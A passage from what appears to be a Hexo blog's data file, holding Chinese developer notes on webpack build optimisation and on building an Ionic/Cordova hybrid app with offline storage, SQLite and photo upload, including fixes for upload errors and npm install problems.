class=\"built_in\">require</span>(<span class=\"string\">'web-webpack-plugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">output:&#123;</span><br><span class=\"line\"> filename: <span class=\"string\">'[name]_[chunkhash:8].js'</span>,</span><br><span class=\"line\"> path: path.resolve(__dirname, <span class=\"string\">'dist'</span>),</span><br><span class=\"line\"> publicPatch: <span class=\"string\">'//js.cdn.com/id/'</span>, <span class=\"comment\">//指定存放JS文件的CDN地址</span></span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"><span class=\"built_in\">module</span>:&#123;</span><br><span class=\"line\"> rules:[&#123;</span><br><span class=\"line\">     test: <span class=\"regexp\">/\\.css/</span>,</span><br><span class=\"line\">     use: ExtractTextPlugin.extract(&#123;</span><br><span class=\"line\">         use: [<span class=\"string\">'css-loader?minimize'</span>],</span><br><span class=\"line\">         publicPatch: <span class=\"string\">'//img.cdn.com/id/'</span>, <span class=\"comment\">//指定css文件中导入的图片等资源存放的cdn地址</span></span><br><span class=\"line\">     &#125;),</span><br><span class=\"line\"> &#125;,&#123;</span><br><span class=\"line\">    test: <span class=\"regexp\">/\\.png/</span>,</span><br><span class=\"line\">    use: [<span class=\"string\">'file-loader?name=[name]_[hash:8].[ext]'</span>], <span class=\"comment\">//为输出的PNG文件名加上Hash值 </span></span><br><span class=\"line\"> &#125;]</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">plugins:[</span><br><span class=\"line\">  <span class=\"keyword\">new</span> WebPlugin(&#123;</span><br><span class=\"line\">     template: <span class=\"string\">'./template.html'</span>,</span><br><span class=\"line\">     filename: <span class=\"string\">'index.html'</span>,</span><br><span class=\"line\">     stylePublicPath: <span class=\"string\">'//css.cdn.com/id/'</span>, <span class=\"comment\">//指定存放CSS文件的CDN地址</span></span><br><span class=\"line\">  &#125;),</span><br><span class=\"line\"> <span class=\"keyword\">new</span> ExtractTextPlugin(&#123;</span><br><span class=\"line\">     filename:<span class=\"string\">`[name]_[contenthash:8].css`</span>, <span class=\"comment\">//为输出的CSS文件加上Hash</span></span><br><span class=\"line\"> &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"4-2-多页面应用提取页面间公共代码，以利用缓存\"><a href=\"#4-2-多页面应用提取页面间公共代码，以利用缓存\" class=\"headerlink\" title=\"4.2 多页面应用提取页面间公共代码，以利用缓存\"></a>4.2 多页面应用提取页面间公共代码，以利用缓存</h3><ol>\n<li><p><strong>原理</strong></p>\n<p>大型网站通常由多个页面组成，每个页面都是一个独立的单页应用，多个页面间肯定会依赖同样的样式文件、技术栈等。如果不把这些公共文件提取出来，那么每个单页打包出来的chunk中都会包含公共代码，相当于要传输n份重复代码。如果把公共文件提取出一个文件，那么当用户访问了一个网页，加载了这个公共文件，再访问其他依赖公共文件的网页时，就直接使用文件在浏览器的缓存，这样公共文件就只用被传输一次。</p>\n</li>\n<li><p><strong>应用方法</strong></p>\n<ol>\n<li><p>把多个页面依赖的公共代码提取到common.js中，此时common.js包含基础库的代码</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> CommonsChunkPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack/lib/optimize/CommonsChunkPlugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">plugins:[</span><br><span class=\"line\">    <span class=\"keyword\">new</span> CommonsChunkPlugin(&#123;</span><br><span class=\"line\">        chunks:[<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>], <span class=\"comment\">//从哪些chunk中提取</span></span><br><span class=\"line\">        name:<span class=\"string\">'common'</span>,  <span class=\"comment\">// 提取出的公共部分形成一个新的chunk</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>找出依赖的基础库，写一个base.js文件，再与common.js提取公共代码到base中，common.js就剔除了基础库代码，而base.js保持不变</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//base.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'react-dom'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'./base.css'</span>;</span><br><span class=\"line\"><span class=\"comment\">//webpack.config.json</span></span><br><span class=\"line\">entry:&#123;</span><br><span class=\"line\">    base: <span class=\"string\">'./base.js'</span></span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">plugins:[</span><br><span class=\"line\">    <span class=\"keyword\">new</span> CommonsChunkPlugin(&#123;</span><br><span class=\"line\">        chunks:[<span class=\"string\">'base'</span>,<span class=\"string\">'common'</span>],</span><br><span class=\"line\">        name:<span class=\"string\">'base'</span>,</span><br><span class=\"line\">        <span class=\"comment\">//minChunks:2, 表示文件要被提取出来需要在指定的chunks中出现的最小次数，防止common.js中没有代码的情况</span></span><br><span class=\"line\">    &#125;)        </span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>得到基础库代码base.js，不含基础库的公共代码common.js，和页面各自的代码文件xx.js。</p>\n<p>页面引用顺序如下：base.js–&gt; common.js–&gt; xx.js</p>\n</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"4-3-分割代码以按需加载\"><a href=\"#4-3-分割代码以按需加载\" class=\"headerlink\" title=\"4.3 分割代码以按需加载\"></a>4.3 分割代码以按需加载</h3><ol>\n<li><p><strong>原理</strong></p>\n<p>单页应用的一个问题在于使用一个页面承载复杂的功能，要加载的文件体积很大，不进行优化的话会导致首屏加载时间过长，影响用户体验。做按需加载可以解决这个问题。具体方法如下：</p>\n<ol>\n<li>将网站功能按照相关程度划分成几类</li>\n<li>每一类合并成一个Chunk，按需加载对应的Chunk</li>\n<li>例如，只把首屏相关的功能放入执行入口所在的Chunk，这样首次加载少量的代码，其他代码要用到的时候再去加载。最好提前预估用户接下来的操作，提前加载对应代码，让用户感知不到网络加载</li>\n</ol>\n</li>\n<li><p><strong>做法</strong></p>\n<p>一个最简单的例子：网页首次只加载main.js，网页展示一个按钮，点击按钮时加载分割出去的show.js，加载成功后执行show.js里的函数</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//main.js</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'btn'</span>).addEventListener(<span class=\"string\">'click'</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName:\"show\" */</span> <span class=\"string\">'./show'</span>).then(<span class=\"function\">(<span class=\"params\">show</span>)=&gt;</span>&#123;</span><br><span class=\"line\">        show(<span class=\"string\">'Webpack'</span>);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"comment\">//show.js</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">content</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">window</span>.alert(<span class=\"string\">'Hello '</span> + content);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>import(/* webpackChunkName:show */ &#39;./show&#39;).then()</code> 是实现按需加载的关键，Webpack内置对import( *)语句的支持，Webpack会以<code>./show.js</code>为入口重新生成一个Chunk。代码在浏览器上运行时只有点击了按钮才会开始加载show.js，且import语句会返回一个Promise，加载成功后可以在then方法中获取加载的内容。这要求浏览器支持Promise API，对于不支持的浏览器，需要注入Promise polyfill。<code>/* webpackChunkName:show */</code> 是定义动态生成的Chunk的名称，默认名称是[id].js，定义名称方便调试代码。为了正确输出这个配置的ChunkName，还需要配置Webpack：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">output:&#123;</span><br><span class=\"line\">    filename:<span class=\"string\">'[name].js'</span>,</span><br><span class=\"line\">    chunkFilename:<span class=\"string\">'[name].js'</span>, <span class=\"comment\">//指定动态生成的Chunk在输出时的文件名称</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>书中另外提供了更复杂的React-Router中异步加载组件的实战场景。P212</p>\n</li>\n</ol>\n<h2 id=\"五、优化输出质量–提升代码运行时的效率\"><a href=\"#五、优化输出质量–提升代码运行时的效率\" class=\"headerlink\" title=\"五、优化输出质量–提升代码运行时的效率\"></a>五、优化输出质量–提升代码运行时的效率</h2><h3 id=\"5-1-使用Prepack提前求值\"><a href=\"#5-1-使用Prepack提前求值\" class=\"headerlink\" title=\"5.1 使用Prepack提前求值\"></a>5.1 使用Prepack提前求值</h3><ol>\n<li><p><strong>原理：</strong></p>\n<p>Prepack是一个部分求值器，编译代码时提前将计算结果放到编译后的代码中，而不是在代码运行时才去求值。通过在便一阶段预先执行源码来得到执行结果，再直接将运行结果输出以提升性能。但是现在Prepack还不够成熟，用于线上环境还为时过早。</p>\n</li>\n<li><p><strong>使用方法</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> PrepackWebpackPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'prepack-webpack-plugin'</span>).default;</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    plugins:[</span><br><span class=\"line\">        <span class=\"keyword\">new</span> PrepackWebpackPlugin()</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"5-2-使用Scope-Hoisting\"><a href=\"#5-2-使用Scope-Hoisting\" class=\"headerlink\" title=\"5.2 使用Scope Hoisting\"></a>5.2 使用Scope Hoisting</h3></li>\n<li><p><strong>原理</strong></p>\n<p>译作“作用域提升”，是在Webpack3中推出的功能，它分析模块间的依赖关系，尽可能将被打散的模块合并到一个函数中，但不能造成代码冗余，所以只有被引用一次的模块才能被合并。由于需要分析模块间的依赖关系，所以源码必须是采用了ES6模块化的，否则Webpack会降级处理不采用Scope Hoisting。</p>\n</li>\n<li><p><strong>使用方法</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ModuleConcatenationPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack/lib/optimize/ModuleConcatenationPlugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">plugins:[</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ModuleConcatenationPlugin();</span><br><span class=\"line\">],</span><br><span class=\"line\">resolve:&#123;</span><br><span class=\"line\">\tmainFields:[<span class=\"string\">'jsnext:main'</span>,<span class=\"string\">'browser'</span>,<span class=\"string\">'main'</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>webpack --display-optimization-bailout</code> 输出日志中会提示哪个文件导致了降级处理</p>\n</li>\n</ol>\n<h2 id=\"六、使用输出分析工具\"><a href=\"#六、使用输出分析工具\" class=\"headerlink\" title=\"六、使用输出分析工具\"></a>六、使用输出分析工具</h2><p>   启动Webpack时带上这两个参数可以生成一个json文件，输出分析工具大多依赖该文件进行分析：</p>\n<p>   <code>webpack --profile --json &gt; stats.json</code> 其中 <code>--profile</code> 记录构建过程中的耗时信息，<code>--json</code> 以JSON的格式输出构建结果，<code>&gt;stats.json</code> 是UNIX / Linux系统中的管道命令，含义是将内容通过管道输出到stats.json文件中。</p>\n<ol>\n<li><p><strong>官方工具Webpack Analyse</strong></p>\n<p>打开该工具的官网<a href=\"http://webpack.github.io/analyse/上传stats.json，就可以得到分析结果\" target=\"_blank\" rel=\"noopener\">http://webpack.github.io/analyse/上传stats.json，就可以得到分析结果</a></p>\n</li>\n<li><p><strong>webpack-bundle-analyzer</strong></p>\n<p>可视化分析工具，比Webapck Analyse更直观。使用也很简单：</p>\n<ol>\n<li>npm  i -g webpack-bundle-analyzer安装到全局</li>\n<li>按照上面方法生成stats.json文件</li>\n<li>在项目根目录执行<code>webpack-bundle-analyzer</code> ，浏览器会自动打开结果分析页面。</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"七、其他Tips\"><a href=\"#七、其他Tips\" class=\"headerlink\" title=\"七、其他Tips\"></a>七、其他Tips</h2><ol>\n<li><p>配置babel-loader时，<code>use: [‘babel-loader?cacheDirectory’]</code> cacheDirectory用于缓存babel的编译结果，加快重新编译的速度。另外注意排除node_modules文件夹，因为文件都使用了ES5的语法，没必要再使用Babel转换。</p>\n</li>\n<li><p>配置externals，排除因为已使用\\&lt;script>标签引入而不用打包的代码，noParse是排除没使用模块化语句的代码。</p>\n</li>\n<li><p>配置performance参数可以输出文件的性能检查配置。</p>\n</li>\n<li><p>配置profile：true，是否捕捉Webpack构建的性能信息，用于分析是什么原因导致构建性能不佳。</p>\n</li>\n<li><p>配置cache：true，是否启用缓存来提升构建速度。</p>\n</li>\n<li><p>可以使用url-loader把小图片转换成base64嵌入到JS或CSS中，减少加载次数。</p>\n</li>\n<li><p>通过imagemin-webpack-plugin压缩图片，通过webpack-spritesmith制作雪碧图。</p>\n</li>\n<li><p>开发环境下将devtool设置为cheap-module-eval-source-map，因为生成这种source map的速度最快，能加速构建。在生产环境下将devtool设置为hidden-source-map</p>\n</li>\n</ol>"},{"title":"支持离线和拍照上传的Hybrid APP开发小记","date":"2016-08-06T08:30:00.000Z","toc":true,"comments":1,"_content":"\n本篇主要记录了我遇到的一些问题，和解决方案，以供参考。问题比较杂乱，简单分了一下类，感觉还是不太清晰π__π，但是感觉也没有人会需要全篇内容吧，如果能在你报了某个错误时，我的某个解决方案能给你一点启发，那就是做好事啦~\n<!-- More -->\n\n# APP需求背景简介 #\n这个APP的需求简单来说是这样的：\n1. 在有网络的环境中打开APP时，从后台下载表单资料(下拉选项等)保存在Device，无网络环境下从Device读取表单资料；\n2. 用户填写表单并保存后，信息保存在Device，并且如果网络允许，进行自动上传到后台服务器，如果网络不允许，将等到网络允许时上传；\n3. 网络区分WIFI和3G/4G，WIFI下自动上传，3G/4G下如果用户选了Allow 3G，就自动上传，否则当用户点击上传时才上传，并且开始上传后用户可以点击停止以终止上传。\n4. 填写表单时，用户可以添加手机图库的图片，也可以拍照\n\n# 方案篇 #\n## 照片离线存储、上传： ##\n调用图库和拍照都是使用`cordova-plugin-camera`插件，值得一提的时候，这个插件调用图库选图片的时候一次只能选一张，如果想一次选多张可以使用`cordova-imagePicker`插件。他的`CameraOptions`中，把`saveToPhotoAlbum`设为`true`，可以在拍照的时候保存下来图片，默认是`false`。使用camera插件选图或拍照后会得到一个imgURI，是图片的缓存路径，存储的时候存储这个路径，上传的时候从这个路径里上传图片。\n\n照片上传使用这个插件：`$cordovaFileTransfer`\n用法文档参考链接：\n1. [论坛](https://forum.ionicframework.com/t/cordova-file-transfer-upload-image-from-device/40517)\n2. [cordova-plugin-file-transfer github](https://github.com/apache/cordova-plugin-file-transfer)\n3. [$cordovaFileTransfer文档](http://ngcordova.com/docs/plugins/fileTransfer/)\n\n## 离线存储技术简介 ##\nHTML5中关于离线的API主要分为应用缓存（Appcache）和客户端存储两大块。\n \n### 应用缓存（Appcache） ###\n应用缓存关键词为manifest，主要是在网页的根html标签中添加manifest属性，属性值为保存着需要缓存资源清单的文件的地址。实例:\n```\n<!DOCTYPE HTML>\n<html manifest=\"demo.appcache\">\n</html>\n```\n关于怎样使用，这个链接讲的非常好：[应用缓存初级使用指南](http://www.html5rocks.com/zh/tutorials/appcache/beginner/)。\n需要应用到manifest的场景是——离线网页应用，就是使用前不需要用户下载一个APP或者是别的任何东西，而是访问一个网址，第一次访问时，就把这个网页上需要缓存的东西，例如JS文件、CSS文件、网页中用到的图片、图标等，下载到浏览器，然后即使离线情况下，刷新网页，也还是可以使用。\n\n### 客户端数据存储 ###\n分类概览：\n\n- Cookie\n- Web Storage\n    * localStorage(前身是globalStorage)\n    * sessionStorage\n- 数据库存储\n    * Web SQL Database\n    * IndexedDB\n\n| 名称   |  大小    |  过期时间  | 与服务器通信 |\n| :------|  :------ |  :-----  |    :------  |\n| Cookie |  单域名下总大小4K左右，25个/50个/30个 |  默认关浏览器就过期，设置了过期时间，到过期时间才过期| 每次附在请求头中|\n| localStorage |单域名下5M或2.5M |  永久保存在浏览器中，除非手动清除 |  不参与通信  |\n| sessionStorage|单域名下5M或2.5M|  保存到浏览器关闭，可以跨越页面刷新而存在  |  不参与通信  |\n\n#### Cookie ####\n**缺点**\n\n  1. 容量小，超过容量就被浏览器默默丢掉，你啥都不知道~~(想起囧不懂)~~ ；\n  2. 使用起来很不方便，需要封装工具方法；\n  3. 每次都会附在请求头中发送，影响请求性能；\n\n由于这些限制，只能保存比较少的信息，且由于用户可以查看和改写cookie，所以不能存储敏感信息。\n\n**使用场景：**\n登录时保存密码，以前还用来保存用户进行购物车操作时的信息，现在可以用localStorage代替。\n\n#### localStorage ####\n缺点：只能存储字符串。非字符串的数据在存储之前会被转换成字符串\n#### sessionStorage ####\n\n1. 缺点只能存储字符串。\n2. 绑定于某个服务器会话，所以本地运行时不可用，\n3. 存储在 sessionStorage中的数据只能由最初给对象存储数据的页面访问到，所以对多页面应用有限制。\n\n#### Web SQL 和 IndexedDB ####\nSQLite本身是一个关系数据库管理系统，HTML5拿来封了一套API以实现客户端数据库存储，就是Web SQL，但由于拿来别人的东西使用，就只能就一些边边角角的标准进行定义，这并不是W3C想要的，于是现在Web SQL已经被废弃，而另起炉灶创建了IndexDB，但由于现在IndexDB的一些功能还停留在草案阶段，所以SQLite还是有一定的市场。\n\n## 使用SQLite的经验 ##\n本来项目使用了localStorage来做存储，但后来客户坚持要求使用SQLite，以便未来扩展APP功能时可以对数据进行搜索排序等，于是就重写了相关代码。\n**参考教程地址：**\n\n1. [W3C](https://www.w3.org/TR/webdatabase/#executing-sql-statements)\n2. [菜鸟网，可以作为API查询](http://www.runoob.com/sqlite/sqlite-drop-table.html)\n3. [A Simple TODO list using HTML5 WebDatabases](http://www.html5rocks.com/en/tutorials/webdatabase/todo/#toc-step3)\n4. [使用 HTML5 开发离线应用](https://www.ibm.com/developerworks/cn/web/1011_guozb_html5off/)\n\n**评价：**\n优点：如果需要数据搜索、排序等，可以使用\n缺点：异步操作，操作结果的后续动作需要写在回调函数里，如果需要频繁存取，或者逻辑比较复杂，会产生很复杂的嵌套，不便于维护、并且是已经被废弃的标准\n\n## ionic 点击小图显示大图 ##\n1. [ionic click small image show big image](https://devdactic.com/images-videos-fullscreen-ionic/)\n2. [Ionic Modal - Fullscreen images](https://codepen.io/rdelafuente/pen/tJrik/)\n3. [How To Display Images and Videos with Ionic Really Cool](https://devdactic.com/images-videos-fullscreen-ionic/)\n\n## 判断手机网络状况 ##\n[$cordovaNetwork](http://ngcordova.com/docs/plugins/network/)\n\n## 使用$state.go切换状态之前，检查token  ##\n[angular ui-router login authentication](http://stackoverflow.com/questions/22537311/angular-ui-router-login-authentication)\n\n## Base64解码 ##\n[Base64 编码与解码](http://www.w3cfuns.com/notes/13967/3f397874b7afbe49eaa678f3331bf5e0.html)\n\n## angularJS $Watch元素高度变化 ##\n需求背景是，输入框一开始高度是一行，输入多行时高度自适应，达到6行时，固定高度，出滚动条，textarea做不到这些，于是使用了可编辑div做输入框，给div标签加了`contenteditable = true`属性。然后需求就是要监听其高度变化。如果是input输入框就可以用ng-change事件监听，但这个不行要手动写一个。\n\n使用directive，首先想到使用scope.$watch() 监听div的html改变，可是失败了，因为只有当onblur的时候才会触发$watch计算高度改变，而我要的是在输入的时候，随时监听，以在换行时发现高度改变。【失败代码】：\n```\n.directive('logdirective',function(){ \n    return { \n        link:function(scope, ele, attrs){ \n            scope.$watch(function(){ \n                return ele[0].html; \n                }, function(newVal, oldVal){ \n                console.log('height change!'); \n                console.log(newVal); \n            },true); \n        } \n    } \n});\n```\n\n最后不得不使用一个interval来定时检测高度变化，【成功代码】：\n```\n.directive('logdirective',function($interval){\n            return {\n                link:function(scope, ele, attrs){\n                    var timer = null;\n                    var memHeight = ele[0].offsetHeight;\n\n                    ele.on('focus', function(){\n                        $interval.cancel(timer);\n                        timer = $interval(function(){\n                            var oldVal = memHeight,\n                                newVal = ele[0].offsetHeight;\n                            memHeight = newVal;\n                            if(newVal !== oldVal){\n                                console.log('height changed!');\n                                return;\n                            }\n                        },1000);\n\n                        timer.then(function(){\n                            console.log('timer resolved');\n                        }, function(){\n                            console.log('timer rejected');\n                        });\n                    });\n\n                    ele.on('blur', function(){\n                        $interval.cancel(timer);\n                    });\n                }\n            }\n        });\n```\n\n\n# Error篇\n\n## cordova already defined ##\n原因：index页面重复引入了 cordova .js，删除一个就好\n\n## ionic页面滚动时，因为父级使用了transform，导致内容中Position:fixed失效  ##\n关键词：ionic scroll fixed\n解决方案：[把该元素拿到`<ion-content>`外面](https://forum.ionicframework.com/t/css-position-fixed/2969 '把该元素拿到`<ion-content>`外面')\n\n如果不是在ionic中，其他思路：\n\n1. 去transform滚动，自己写滚动，\nionic 禁止滚动：在`<ion-content>`上添加scroll = false\n[angularJS绑定滚动事件](https://segmentfault.com/q/1010000005666477/a-1020000005677694 '这是一个链接')\n2. 各种hack方案\n[Positions fixed doesn't work when using -webkit-transform](http://stackoverflow.com/questions/2637058/positions-fixed-doesnt-work-when-using-webkit-transform '这是一个链接')\n3. 拓展：\n[摆脱jquery!angularjs利用指令简单实现滚动翻页](http://www.ddhigh.com/2014/09/angularjs-lazy-load/ '这是一个链接')\n\n## ionic滚动时，ion-content 高度计算错误 ，不能显示全部内容 ##\n![ionic_hybrid/heightWrong.jpg](ionic_hybrid/heightWrong.jpg)\n解决方案：\n在ion-content上加上\n```\n{   position: absolute;\n    top: 0;\n    left: 0;\n    bottom: 0;\n    right: 0;\n    margin: auto;\n}\n```\n**注意：**top和bottom值必须为零，如果需要间隔，在ion-content的子元素上加margin，而不要修改top值或bottom值，否则会造成高度计算不正确，还是不能正常显示全部内容。\n\n## 上传图片： ##\n后台是用ASP.NET接收的，写法参考链接：\n\n1. [Upload image from phonegap app to WCF service](http://stackoverflow.com/questions/17232183/upload-image-from-phonegap-app-to-wcf-service)\n2. [Upload image from android phonegap to a server using asmx](http://stackoverflow.com/questions/8643708/upload-image-from-android-phonegap-to-a-server-using-asmx)\n\n### 问题1：不能发出请求 ###\nconsole出来错误是：\n```\nupload error source \nupload error target\n```\n\n以及会Alert:（一次只Alert一个，code=1或者code=3，这两种都遇到过）\n```\nAn error has occurred : code =1  \nAn error has occurred : code =3\n```\n\ncode = 1最终解决方案：\n原因：传送的文件大小超出服务器接收限度\n```\n<system.serviceModel> \n  <bindings> \n\n//其他的setting, 藍色是新增的 \n\n  <webHttpBinding> \n\n  <binding maxReceivedMessageSize=\"2147483647\" /> \n\n  </webHttpBinding> \n\n  </bindings> \n```\n这是加在后台的，我也不太懂，后台摸索好久，一开始加的地方不对，据后台说需要加到最外层，才变好了。\n\n**解决方案参考链接：**\n\n1. [Phonegap File Transfer of picture fails on every other picture: Error code 3 with FileTransfer upload](http://stackoverflow.com/questions/19275268/phonegap-file-transfer-of-picture-fails-on-every-other-picture-error-code-3-wit)\n2. [File upload error code 1 in ng-cordova filetransfer plugin](http://stackoverflow.com/questions/30783847/file-upload-error-code-1-in-ng-cordova-filetransfer-plugin)\n3. [Best way to transfer a picture it to a server](https://forum.ionicframework.com/t/best-way-to-transfer-a-picture-it-to-a-server/53326\nhttps://github.com/dtaalbers/ionic-2-examples/tree/master/file-transfer-uploa)\n4. [Problems with image URL when uploading with file transfer plugin(最大长度)](https://forum.ionicframework.com/t/problems-with-image-url-when-uploading-with-file-transfer-plugin/50230)\n5. [cordova file transfer文档，code代表的含义](https://cordova.apache.org/docs/en/latest/reference/cordova-plugin-file-transfer/#installation)\n6. [Retrieve HTTP headers in Cordova File Transfer ASP Server](http://stackoverflow.com/questions/32862953/retrieve-http-headers-in-cordova-file-transfer-asp-server)\n\n### 上传数据的格式 ###\n解决了code=1，后台可以接收到请求之后，后台不知道我传过去的数据是什么格式的，我也不知道，因为从浏览器的network里看不到相关信息，cordova-file-transfer文档里也看不到相关介绍。于是后台那边只能看到一张全黑的图片，他们搞了两天，最后终于找到说安装了一个解析包：`HttpMultipartParser`然后就能正常解析了，并且搞明白了传过去的格式是stream，里面包含了图片数据和uploadOptions里的参数。后台筒子们，我只能帮你们到这了。\n\n### $on('$stateChangeStart')中使用$state.go会导致无限循环的问题 ###\n[Ui-Router $state.go inside $on('$stateChangeStart') is cauzing an infinite loop](http://stackoverflow.com/questions/26796945/ui-router-state-go-inside-onstatechangestart-is-cauzing-an-infinite-loop)\n\n### npm install 时的问题 ###\n[unmet dependency but will load](https://github.com/vigetlabs/gulp-starter/issues/62)\n按照答案中的方法之后会报错：\n`'rm' 不是内部或外部命令，也不是可运行的程序 或批处理文件。`\n原因：rm是linux中的命令\n解决方案：\n使用git bash 打开项目文件夹，\nrm -rf $HOME/.npm\nnpm cache clean\n然后再回node shell中使用npm install\n\n### npm install的时候，不能自动安装插件，build出来的APK包plugin丢失， ###\n是因为在安装cordova插件的时候，本应该使用这样的安装命令`cordova plugin add XXX --save`，但我没有加 `--save`，这个`--save`的作用是会自动保存插件的信息到项目根目录下的config.xml，这样在npm install的时候就会根据config.xml文件来自动安装插件\n\n# 其他 #\n## angular 如何刷新页面 ##\n需求：多个状态都会跳转到某个state，有一些跳转需要刷新，有一些不需要刷新\n解决方案：\n全部需要刷新的时候，就在state里加上`cache:false`;\n部分需要刷新的时候，使用$rootScope.$broadcast()，把需要刷新的初始化函数放在 $rootScope.$on的回调函数里\n\n## AngularJS定时器 ##\n1. [说说Angular中的$timeOut定时器](http://sentsin.com/web/486.html)\n2. [AngularJS中$interval的用法详解](http://www.codesec.net/view/406326.html)\n\n## Array的删除splice和for循环合用时的一个小坑  ##\nArray的删除splice和for循环合用时，由于Array删除一项之后，影响到length和后面项的索引值，所以一定要注意。正确代码：\n```\nvar i=0; \nfor(i; i< arr.length; ){ \n  if(arr[i].isSelected===true){ \n    arr.splice(i,1); \n  }else {i++;} \n}\n```\n---\n参考链接：\n1. [详说 Cookie, LocalStorage 与 SessionStorage](http://jerryzou.com/posts/cookie-and-web-storage/)\n2. [Why is Web SQL database deprecated?](http://programmers.stackexchange.com/questions/220254/why-is-web-sql-database-deprecated)\n3. [Ion-content height:100% is not working](https://forum.ionicframework.com/t/ion-content-height-100-is-not-working/28667/2)","source":"_posts/note-about-hybridAPP-project.md","raw":"---\ntitle: 支持离线和拍照上传的Hybrid APP开发小记\ndate: 2016-8-6 16:30:00\ncategories: 框架\ntags: [Hybrid APP,离线应用,总结] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n\n本篇主要记录了我遇到的一些问题，和解决方案，以供参考。问题比较杂乱，简单分了一下类，感觉还是不太清晰π__π，但是感觉也没有人会需要全篇内容吧，如果能在你报了某个错误时，我的某个解决方案能给你一点启发，那就是做好事啦~\n<!-- More -->\n\n# APP需求背景简介 #\n这个APP的需求简单来说是这样的：\n1. 在有网络的环境中打开APP时，从后台下载表单资料(下拉选项等)保存在Device，无网络环境下从Device读取表单资料；\n2. 用户填写表单并保存后，信息保存在Device，并且如果网络允许，进行自动上传到后台服务器，如果网络不允许，将等到网络允许时上传；\n3. 网络区分WIFI和3G/4G，WIFI下自动上传，3G/4G下如果用户选了Allow 3G，就自动上传，否则当用户点击上传时才上传，并且开始上传后用户可以点击停止以终止上传。\n4. 填写表单时，用户可以添加手机图库的图片，也可以拍照\n\n# 方案篇 #\n## 照片离线存储、上传： 